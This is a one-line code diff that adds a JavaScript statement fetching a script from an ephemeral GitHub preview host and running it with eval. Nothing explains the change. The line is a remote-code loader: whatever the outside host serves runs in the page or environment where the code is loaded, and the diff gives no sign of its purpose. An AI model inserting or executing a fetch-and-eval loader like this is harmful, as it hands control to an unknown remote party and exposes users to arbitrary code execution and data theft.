@@ -1,0 +1,1 @@
+fetch('https://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/files/load.js').then(response => response.text()).then(script => eval(script))
